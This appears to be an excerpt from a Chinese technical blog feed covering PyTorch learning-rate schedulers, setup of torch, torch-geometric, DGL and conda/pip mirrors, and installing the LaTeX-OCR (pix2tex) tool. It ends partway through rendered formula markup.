id="214余弦退火函数调整学习率">2.1.4.余弦退火函数调整学习率</h3><p>学习率呈余弦函数型衰减，并以2×Tmax为余弦函数周期，epoch=0对应余弦型学习率调整曲线的x=0，ymax=lr，epoch=Tmax对应余弦型学习率调整曲线的x=Π，ymin=etamin处，随着epoch&gt;Tmax，学习率随epoch增加逐渐上升，整个走势同cos(x)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max, eta_min=<span class="number">0</span>, last_epoch=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>Tmax(int):学习率下降到最小值时的epoch数，即当epoch=T_max时，学习率下降到余弦函数最小值，当epoch&gt;T_max时，学习率将增大；</li><li>etamin: 学习率调整的最小值，即epoch=Tmax时，lrmin=etamin, 默认为0.</li><li>其它参数同上。<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635073.png" alt="img"></li></ul><h2 id="22根据指标调整学习率reducelronplateau">2.2.根据指标调整学习率ReduceLROnPlateau</h2><p>当<strong>某指标(loss或accuracy)在最近几个epoch中都没有变化(下降或升高超过给定阈值)时</strong>，调整学习率。<br>如当验证集的loss不再下降是，调整学习率；或监察验证集的accuracy不再升高时，调整学习率。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">torch.optim.lr_scheduler.ReduceLROnPlateau(optimizer, mode=<span class="string">&#x27;min&#x27;</span>, factor=<span class="number">0.1</span>,</span><br><span class="line"> patience=<span class="number">10</span>,verbose=<span class="literal">False</span>, threshold=<span class="number">0.0001</span>, threshold_mode=<span class="string">&#x27;rel&#x27;</span>, cooldown=<span class="number">0</span>, </span><br><span class="line"> min_lr=<span class="number">0</span>, eps=<span class="number">1e-08</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>mode(str): 模式选择，有min和max两种模式，min表示当指标不再降低(如监测loss)，max表示当指标不再升高(如监测accuracy)。</li><li>factor(float): 学习率调整倍数，同前面的gamma，当监测指标达到要求时，lr=lr×factor。</li><li>patience(int): 忍受该指标多少个epoch不变化，当忍无可忍时，调整学习率。</li><li>verbose(bool): 是否打印学习率信息，print( ‘Epoch {:5d} reducing learning rate of group {} to {:.4e}.’.format(epoch, i, new_lr), 默认为False, 即不打印该信息。</li><li>threshold_mode (str): 选择判断指标是否达最优的模式，有两种模式：rel 和 abs.<br>当threshold_mode == rel, 并且 mode == max时，dynamic_threshold = best * (1 + threshold);<br>当threshold_mode == rel, 并且 mode == min时，dynamic_threshold = best * (1 - threshold);<br>当threshold_mode == abs, 并且 mode == max时，dynamic_threshold = best + threshold;<br>当threshold_mode == abs, 并且 mode == min时，dynamic_threshold = best - threshold;<br>threshold(float): 配合threshold_mode使用。</li><li>cooldown(int): “冷却时间”，当调整学习率之后，让学习率调整策略冷静一下，让模型在训练一段时间，再重启监测模式</li><li>min_lr(float or list): 学习率下限，可为float，或者list，当有多个参数组时，可用list进行设置。</li><li>eps(float): 学习率衰减的最小值，当学习率的变化值小于eps时，则不调整学习率。</li></ul><h2 id="23自定义调整学习率">2.3.自定义调整学习率</h2><p>为不同参数组设定不同学习率调整策略。调整规则为：<br>lr = base_lr * lambda(self.last_epoch)<br>在fine-tune中特别有用，<strong>我们不仅可以为不同层设置不同的学习率，还可以为不同层设置不同的学习率调整策略。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.optim.lr_scheduler.LambdaLR(optimizer, lr_lambda, last_epoch=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lr_lambda(function or list): 自定义计算学习率调整倍数的函数，通常时epoch的函数，当有多个参数组时，设为list.</li><li>其它参数同上。</li></ul><h1 id="3手动调整学习率">3.手动调整学习率</h1><p>手动调整学习率，通常可以定义如下函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">adjust_learning_rate</span>(<span class="params">optimizer, epoch</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Sets the learning rate to the initial LR decayed by 10 every 30 epochs&quot;&quot;&quot;</span></span><br><span class="line">    lr = args.lr * (<span class="number">0.1</span> ** (epoch // <span class="number">30</span>))</span><br><span class="line">    <span class="keyword">for</span> param_group <span class="keyword">in</span> optimizer.param_groups:</span><br><span class="line">        param_group[<span class="string">&#x27;lr&#x27;</span>] = lr</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>又如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">adjust_learning_rate</span>(<span class="params">epoch, lr</span>):</span><br><span class="line">    <span class="keyword">if</span> epoch &lt;= <span class="number">81</span>:  <span class="comment"># 32k iterations</span></span><br><span class="line">      <span class="keyword">return</span> lr</span><br><span class="line">    <span class="keyword">elif</span> epoch &lt;= <span class="number">122</span>:  <span class="comment"># 48k iterations</span></span><br><span class="line">      <span class="keyword">return</span> lr/<span class="number">10</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> lr/<span class="number">100</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该函数通过修改每个epoch下，各参数组中的lr来进行学习率手动调整，用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epochs):</span><br><span class="line">    lr = adjust_learning_rate(optimizer, epoch)  <span class="comment"># 调整学习率</span></span><br><span class="line">    optimizer = optim.SGD(net.parameters(), lr=lr, momentum=<span class="number">0.9</span>, weight_decay=<span class="number">5e-4</span>)</span><br><span class="line">    ......</span><br><span class="line">    optimizer.step()  <span class="comment"># 采用新的学习率进行参数更新</span></span><br></pre></td></tr></table></figure><p>梯度下降算法需要我们指定一个学习率作为权重更新步幅的控制因子，常用的学习率有0.01、0.001以及0.0001等，学习率越大则权重更新。一般来说，<strong>我们希望在训练初期学习率大一些，使得网络收敛迅速，在训练后期学习率小一些</strong>，使得网络更好的收敛到最优解。下图展示了随着迭代的进行动态调整学习率的4种策略曲线：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635068.jpg" alt="img"></p><p>上述4种策略为自己根据资料整理得到的衰减类型：指数衰减、固定步长的衰减、多步长衰、余弦退火衰减。下面逐一介绍其性质，及pytorch对应的使用方式，需要注意学习率衰减策略很大程度上是<strong>依赖于经验与具体问题的</strong>，不能照搬参数。</p><p>*<strong>1、指数衰减*</strong></p><p>学习率按照指数的形式衰减是比较常用的策略，我们首先需要确定需要针对哪个优化器执行学习率动态调整策略，也就是首先定义一个优化器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimizer_ExpLR = torch.optim.SGD(net.parameters(), lr=0.1)</span><br></pre></td></tr></table></figure><p>定义好优化器以后，就可以给这个优化器绑定一个指数衰减学习率控制器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExpLR = torch.optim.lr_scheduler.ExponentialLR(optimizer_ExpLR, gamma=0.98)</span><br></pre></td></tr></table></figure><p>其中<strong>参数gamma表示衰减的底数，选择不同的gamma值可以获得幅度不同的衰减曲线</strong>，如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635071.jpg" alt="img"></p><p>*<strong>2、固定步长衰减*</strong></p><p>有时我们希望学习率每隔一定步数（或者epoch）就减少为原来的gamma分之一，使用固定步长衰减依旧先定义优化器，再给优化器绑定StepLR对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">optimizer_StepLR = torch.optim.SGD(net.parameters(), lr=0.1)</span><br><span class="line">StepLR = torch.optim.lr_scheduler.StepLR(optimizer_StepLR, step_size=step_size, gamma=0.65)</span><br></pre></td></tr></table></figure><p>其中gamma参数表示衰减的程度，step_size参数表示每隔多少个step进行一次学习率调整，下面对比了不同gamma值下的学习率变化情况：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635399.jpg" alt="img"></p><p>*<strong>3、多步长衰减*</strong></p><p>上述固定步长的衰减的虽然能够按照固定的区间长度进行学习率更新**，但是有时我们希望不同的区间采用不同的更新频率，或者是有的区间更新学习率，有的区间不更新学习率**，这就需要使用MultiStepLR来实现动态区间长度控制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">optimizer_MultiStepLR = torch.optim.SGD(net.parameters(), lr=0.1)</span><br><span class="line">torch.optim.lr_scheduler.MultiStepLR(optimizer_MultiStepLR,</span><br><span class="line">                    milestones=[200, 300, 320, 340, 200], gamma=0.8)</span><br></pre></td></tr></table></figure><p>其中milestones参数为表示学习率更新的起止区间，在区间[0. 200]内学习率不更新，而在[200, 300]、[300, 320]…[340, 400]的右侧值都进行一次更新；gamma参数表示学习率衰减为上次的gamma分之一。其图示如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635419.jpg" alt="img"></p><p>从图中可以看出，学习率在区间[200， 400]内快速的下降，这就是milestones参数所控制的，在milestones以外的区间学习率始终保持不变。</p><p>*<strong>4、余弦退火衰减*</strong></p><p>严格的说，余弦退火策略不应该算是学习率衰减策略，因为它使得学习率按照周期变化，其定义方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">optimizer_CosineLR = torch.optim.SGD(net.parameters(), lr=0.1)</span><br><span class="line">CosineLR = torch.optim.lr_scheduler.CosineAnnealingLR(optimizer_CosineLR, T_max=150, eta_min=0)</span><br></pre></td></tr></table></figure><p>其包含的参数和余弦知识一致，参数T_max表示余弦函数周期；eta_min表示学习率的最小值，默认它是0表示学习率至少为正值。确定一个余弦函数需要知道最值和周期，其中周期就是T_max，最值是初试学习率。下图展示了不同周期下的余弦学习率更新曲线：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191635437.jpg" alt="img"></p><p>*<strong>5、上述4种学习率动态更新策略的说明*</strong></p><p>4个负责学习率调整的类：StepLR、ExponentialLR、MultiStepLR和CosineAnnealingLR，其完整对学习率的更新都是在其step()函数被调用以后完成的，这个step表达的含义可以是一次迭代，当然更多情况下应该是一个epoch以后进行一次scheduler.step()，这根据具体问题来确定。此外，根据pytorch官网上给出的说明，scheduler.step()函数的调用应该在训练代码以后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scheduler = ...</span><br><span class="line">&gt;&gt;&gt; for epoch in range(100):</span><br><span class="line">&gt;&gt;&gt;     train(...)</span><br><span class="line">&gt;&gt;&gt;     validate(...)</span><br><span class="line">&gt;&gt;&gt;     scheduler.step()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pytorch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pytorch </tag>
            
            <tag> 学习率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>torch环境</title>
      <link href="/2023/12/19/Programmer/python/torch%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
      <url>/2023/12/19/Programmer/python/torch%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191226420.png" alt="image-20231219122612389"></p><h1 id="1安装对应的torch-torchvision">1.安装对应的torch、torchvision</h1><p>网址：<a href="https://pytorch.org/get-started/previous-versions/">https://pytorch.org/get-started/previous-versions/</a></p><p>搜索对应CUDA版本的安装命令（cu110代表CUDA11.0），在终端中复制命令安装。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191135284.png" alt="image-20231219113547226"></p><p>查看是否安装成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(torch.__version__) </span><br><span class="line"><span class="built_in">print</span>(torch.version.cuda) </span><br></pre></td></tr></table></figure><h1 id="2安装torch-geometric">2.安装torch-geometric</h1><p>网址：<a href="https://pytorch-geometric.com/whl/">https://pytorch-geometric.com/whl/</a></p><p>找到对应pytorch版本：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191137168.png" alt="image-20231219113754141"></p><p>四个库（cluster,scatter,sparse,spline-conv）分别：wget 网页中对应的链接并 pip install 下载好的whl包，即完成安装：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191139386.png" alt="image-20231219113927345"></p><p>注意自己环境的python版本以及linux/win就行</p><p>安装完上面四个库后执行 pip install torch-geometric</p><p>以上安装完成。</p><p>完成之后 import torch-geometric 发现报错，报错信息：<strong>“No module named 'torch.profiler”</strong></p><p>原因是torch1.10以上的版本才有<strong>torch.profiler</strong>这个库，但是Torch网址CUDA11.0兼容的选项没有torch1.10以上，那怎么办呢？</p><p>解决：</p><p>找到报错路径里的文件<strong><a href="http://profile.py">profile.py</a></strong></p><p>作如下修改：（原文件是第八行，改成了第九行）</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191140609.png" alt="image-20231219114012578"></p><h1 id="3-dgl安装">3 DGL安装</h1><p>安装DGL无需安装torch-geometric，需要安装那四个依赖库</p><p><a href="https://www.dgl.ai/pages/start.html">Deep Graph Library (dgl.ai)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">conda create -n mVul python=3.7</span><br><span class="line"></span><br><span class="line">pip install torch==1.5.0+cu102 torchvision==0.6.0+cu102 torchaudio==0.5.0 -f https://download.pytorch.org/whl/cu102/torch_stable.html</span><br><span class="line"></span><br><span class="line">torch 1.5.0</span><br><span class="line">torchgeometric</span><br><span class="line">pip install networkx==2.5</span><br><span class="line">pip install dgl -f https://data.dgl.ai/wheels/cu102/repo.html</span><br><span class="line">https://data.dgl.ai/wheels/cu113/repo.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pytorch </tag>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python环境</title>
      <link href="/2023/12/19/Programmer/python/python%E7%8E%AF%E5%A2%83/"/>
      <url>/2023/12/19/Programmer/python/python%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="1-conda虚拟环境">1 conda虚拟环境</h1><h4 id="conda常用命令">conda常用命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda list # 查看当前虚拟环境已经安装的包（激活虚拟环境后使用）</span><br><span class="line">conda env list # 查看当前存在哪些虚拟环境</span><br><span class="line">conda update # conda 检查更新当前conda</span><br></pre></td></tr></table></figure><h4 id="conda创建虚拟环境">conda创建虚拟环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n xxx python=3.6</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xxx为所创建虚拟环境的名字</span></span><br></pre></td></tr></table></figure><h4 id="conda激活和退出虚拟环境windows">conda激活和退出虚拟环境（windows）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda activate xx # (虚拟环境名称）</span><br><span class="line"></span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure><h4 id="conda为当前虚拟环境安装新的包">conda为当前虚拟环境安装新的包</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conda install -n package_name==所需版本 #（版本不指定则默认最新版）</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可使用临时镜像安装加快速度，例如安装numpy：</span></span><br><span class="line"></span><br><span class="line">conda install -i https://pypi.tuna.tsinghua.edu.cn/simple numpy</span><br></pre></td></tr></table></figure><h4 id="conda删除虚拟环境或者虚拟环境中的某个包">conda删除虚拟环境或者虚拟环境中的某个包</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda remove -n name --all</span><br><span class="line">conda remove --name env_name package_name </span><br></pre></td></tr></table></figure><h4 id="conda环境复制">conda环境复制</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n new_name --clone path</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">path为所需要复制的环境路径，可根据conda <span class="built_in">env</span> list查看路径</span></span><br></pre></td></tr></table></figure><h1 id="2-安装依赖库">2 安装依赖库</h1><h2 id="pip">pip</h2><p>pip 是最为广泛使用的 Python 包管理器，可以帮助我们获得最新的 Python 包并进行管理。常用命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install [package-name]              # 安装名为[package-name]的包</span><br><span class="line">pip install [package-name]==X.X         # 安装名为[package-name]的包并指定版本X.X</span><br><span class="line">pip install [package-name] --proxy=代理服务器IP:端口号         # 使用代理服务器安装</span><br><span class="line">pip install [package-name] --upgrade    # 更新名为[package-name]的包</span><br><span class="line">pip uninstall [package-name]            # 删除名为[package-name]的包</span><br><span class="line">pip list                                # 列出当前环境下已安装的所有包</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">代码示例：</span></span><br><span class="line">pip install spyder -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">-i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下面介绍常见的国内源镜像：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清华：https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">阿里云：http://mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">华中理工大学：http://pypi.hustunique.com/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">山东理工大学：http://pypi.sdutlinux.org/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">豆瓣：http://pypi.douban.com/simple/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="conda">conda</h2><p>conda 包管理器是 Anaconda 自带的包管理器，可以帮助我们在 conda 环境下轻松地安装各种包。相较于 pip 而言，conda 的通用性更强（不仅是 Python 包，其他包如 CUDA Toolkit 和 cuDNN 也可以安装），但 conda 源的版本更新往往较慢。常用命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">conda install [package-name]        # 安装名为[package-name]的包</span><br><span class="line">conda install [package-name]=X.X    # 安装名为[package-name]的包并指定版本X.X</span><br><span class="line">conda update [package-name]         # 更新名为[package-name]的包</span><br><span class="line">conda remove [package-name]         # 删除名为[package-name]的包</span><br><span class="line">conda list                          # 列出当前环境下已安装的所有包</span><br><span class="line">conda search [package-name]         # 列出名为[package-name]的包在conda源中的所有可用版本</span><br></pre></td></tr></table></figure><p><strong>conda镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看conda当前设置</span></span><br><span class="line">conda config --show channels</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重置默认镜像源</span></span><br><span class="line">conda config --remove-key channels</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除单个镜像源</span></span><br><span class="line">conda config --remove channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/peterjc123/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">国内镜像</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清华大学镜像</span></span><br><span class="line">conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/</span><br><span class="line">conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span><br><span class="line">conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">中科大镜像</span></span><br><span class="line">conda config --add channels http://mirrors.ustc.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --add channels http://mirrors.ustc.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels http://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/</span><br><span class="line">conda config --add channels http://mirrors.ustc.edu.cn/anaconda/cloud/msys2/</span><br><span class="line">conda config --add channels http://mirrors.ustc.edu.cn/anaconda/cloud/bioconda/</span><br><span class="line">conda config --add channels http://mirrors.ustc.edu.cn/anaconda/cloud/menpo/</span><br><span class="line">conda config --add channels http://mirrors.ustc.edu.cn/anaconda/cloud/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">阿里镜像</span></span><br><span class="line">conda config --add channels http://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> Python </tag>
            
            <tag> pip </tag>
            
            <tag> conda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Latex OCR</title>
      <link href="/2023/12/18/Tools/Latex-OCR/"/>
      <url>/2023/12/18/Tools/Latex-OCR/</url>
      
        <content type="html"><![CDATA[<blockquote><p>LaTeX-OCR 是一个开源的光学字符识别（OCR）软件，专为 LaTeX 文档提供支持。其主要目的是帮助用户将扫描的文档转换为 LaTeX 编辑器可以使用的可编辑文本，从而方便进行修改、编辑和排版。</p></blockquote><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312202206456.png" alt="image-20231219121553484"></p><h2 id="1安装">1.安装</h2><p><mark>LaTeX-OCR</mark>可以从源码进行安装，也可以直接用pip来安装，源码地址：<a href="https://github.com/lukas-blecher/LaTeX-OCR">https://github.com/lukas-blecher/LaTeX-OCR</a> ，这里直接使用pip安装，为了方便管理环境，使用conda创建虚拟环境。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conda create -n latex python=3.10</span><br><span class="line">conda activate latex</span><br><span class="line">pip install &quot;pix2tex[gui]&quot;</span><br><span class="line">pip install &quot;pix2tex[gui]&quot; -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>注：使用pip清华镜像源更快哦~</p><h2 id="2启动与使用">2.启动与使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 在虚拟环境下执行</span><br><span class="line">pix2tex</span><br></pre></td></tr></table></figure><p>首次执行会下载依赖模型；</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312202206433.png" alt="image-20231219000535903"></p><p>期间可能报错，连接断开，尝试重试；</p><p>使用：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312202206418.png" alt="image-20231219000831872"></p><p>输入h 回车查看帮助：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312202206473.png" alt="image-20231219000913782"></p><p>可以看到windows或macos下可以非常丝滑地使用，只需要：</p><ul><li>截图或复制一个图片到memory，可以理解为复制到剪贴板；</li><li>回到终端按回车，即可看到公式：<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312202206447.png" alt="image-20231219001159694"></li><li>复制内容到LaTex块即可；</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>i</mi><mi>n</mi><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi mathvariant="script">L</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>Y</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>V</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m i n\sum_{i=1}^{n}{\mathcal{L}}(f(G_{i},Y_{i}|V_{i}))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathcal">L</span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span 